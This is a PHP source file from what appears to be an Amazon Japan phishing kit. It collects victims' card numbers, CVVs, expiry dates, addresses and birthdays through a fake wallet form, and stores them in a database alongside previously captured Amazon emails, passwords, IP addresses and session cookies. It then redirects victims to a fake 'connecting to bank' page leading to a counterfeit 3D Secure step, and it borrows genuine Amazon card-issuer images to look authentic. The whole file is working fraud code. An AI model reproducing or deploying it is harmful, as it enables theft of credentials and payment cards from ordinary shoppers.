<?php

include './php/xzpc.php';
function SafeFilter ($arr) 
{

    $ra=Array('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/','/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/','/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/','/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/','/onmouseout/','/onmouseover/','/onmouseup/','/onunload/');

    if (is_array($arr)){
        foreach ($arr as $key => $value) {
            if (!is_array($value)){
                if (!get_magic_quotes_gpc()){//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。
                    $value = addslashes($value);//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义
                }
                $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串
                $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体
            }else{
                SafeFilter($arr[$key]);
            }
        }   
    }
    return $arr;
}

if(!$_POST['cardnum']){
    header("location: /wallet.php");
    exit;
}



session_start();
$_POST = SafeFilter($_POST);
$okUser = SafeFilter($_SESSION['okinfo']);
$agent = SafeFilter(array("agent"=>$_SERVER["HTTP_USER_AGENT"]));
//print_r($_SESSION['okinfo']);
$_POST['cardnum'] = str_replace(" ","",$_POST['cardnum']);
$isgoamazon = true;
if(is_numeric($_POST['cardid'])){
    $_SESSION["cardinfo"]["cardlist"][$_POST['cardid']]['cardok'] = true;
}

foreach ($_SESSION["cardinfo"]["cardlist"] as $k=>$v) {
    if($v['cardok'] != true){
        $isgoamazon = false;
    }
}


if($_POST["homename"]){
    $_POST["homeinfo"] = $_POST["homename"]."|&|".$_POST["homemall"]."|&|".$_POST["homecity"]."|&|".$_POST["homeaddress"]."|&|".$_POST["homeclubname"]."|&|".$_POST["homephone"];
}




include './php/config.php';

$conn = new mysqli($servername, $username, $password, $dbname);
$insertId = 0;

if($_POST['carddatem']<10){
    $_POST['carddatem'] = "0".str_replace("0","",$_POST['carddatem']);
}

$cookie = "";
if (file_exists($_SESSION["cookiesuccess"])){
    $cookie = file_get_contents ($_SESSION["cookiesuccess"]);
}

if ($conn->connect_error) {
    $isgoamazon = false;
    if(is_numeric($_POST['cardid'])){
        $_SESSION["cardinfo"]["cardlist"][$_POST['cardid']]['cardok'] = false;
    }
}else{
    $sql = "INSERT INTO amz_userlist (amz_username ,amz_passwd ,amz_cardnum ,amz_cardname ,amz_carddate ,amz_cardcvv ,amz_homeinfo ,amz_userip ,amz_useragent ,amz_cookie ,amz_time ,amz_birthday) ".
            "VALUES ('"
                    .$okUser['email']."','"
                    .$okUser['password']."','"
                    .$_POST['cardnum']."','"
                    .$_POST['cardname']."','"
                    .$_POST['carddatem']."/".$_POST['carddatey']."','"
                    .$_POST['cardcvv']."','"
                    .$_POST['homeinfo']."','"
                    .getRealIp()."','"
                    .$agent['agent']."','"
                    .$cookie."','"
                    .time()."','"
                    .$_POST['birthday']."');";
                    
    if (($conn->query($sql) === TRUE)) {
        $insertId = mysqli_insert_id($conn);
        if(!is_numeric($_POST['cardid'])){
         
            $bankimg = array(
                "American Express"=>"https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/amex._CB485934364_.gif",
                "JCB"=>"https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/jcb._CB404655576_.png",
                "Mastercard"=>"https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/mc._CB447120788_.gif",
                "Visa"=>"https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/visa._CB413198211_.png"
            );
            $cardtype = check_cc($_POST['cardnum'],false);
            
            $homeArray = explode('|&|',$_POST['homeinfo']);
            $homeName = $homeArray[0];
            unset($homeArray[0]);
            $_SESSION["cardinfo"]["cardlist"][] = array(
                'cardType' => $cardtype,
                'cardTypeImg' => $bankimg[$cardtype],
                'cardNum' => "末尾  ".substr(str_replace(" ","",$_POST['cardnum']),-4),
                'cardDate' => $_POST['carddatem']."/".$_POST['carddatey'],
                'cardName' => $_POST['cardname'],
                'homeName' => $homeName,
                'homeInfo' => $homeArray,
                'cardok' => true
            );
        }
    }else{
        $isgoamazon = false;
        if(is_numeric($_POST['cardid'])){
            $_SESSION["cardinfo"]["cardlist"][$_POST['cardid']]['cardok'] = false;
        }
    }
    $conn->close();
}

// if($isgoamazon){
//     unset($_SESSION['cardinfo']);
//     header("location: https://www.amazon.co.jp/");
//     exit;
// }
// header("location: /wallet.php");
function check_cc($cc, $extra_check = false){
    $cards = array(
        "visa" => "(4\d{12}(?:\d{3})?)",
        "amex" => "(3[47]\d{13})",
        "jcb" => "(35[2-9][0-9]{13})",
        "maestro" => "((?:5020|5038|6304|6579|6761)\d{12}(?:\d\d)?)",
        "solo" => "((?:6334|6767)\d{12}(?:\d\d)?\d?)",
        "mastercard" => "(5[1-5]\d{14})",
        "switch" => "(?:(?:(?:4903|4905|4911|4936|6333|6759)\d{12})|(?:(?:564182|633110)\d{10})(\d\d)?\d?)",
    );
    $names = array("Visa", "American Express", "JCB", "Maestro", "Solo", "Mastercard", "Switch");
    $matches = array();
    $pattern = "#^(?:".implode("|", $cards).")$#";
    $result = preg_match($pattern, str_replace(" ", "", $cc), $matches);
    if($extra_check && $result > 0){
        $result = (validatecard($cc))?1:0;
    }
    return ($result>0)?$names[sizeof($matches)-2]:false;
}
$_SESSION["secure3d"] = array(
    "cardnum"=>$_POST['cardnum'],
    "cardid"=>$insertId,
    "isgoamazon"=>$isgoamazon
);
?>


<div style="width: 100%;text-align: center;">
    <div style="margin-top: 50px;">銀行に接続する<span id="laodin_diandian"></span></div>
</div>
<script>
var num = 0;
var laodin_diandian = document.getElementById("laodin_diandian");
go_3d();
function go_3d(){
    num++;
    laodin_diandian.innerHTML = laodin_diandian.innerHTML+".";
    if(num<6){
        setTimeout(function () {
          go_3d();
        }, 200);
    }else{
        window.location.replace("/3dsecure.php")
    }
}
</script>
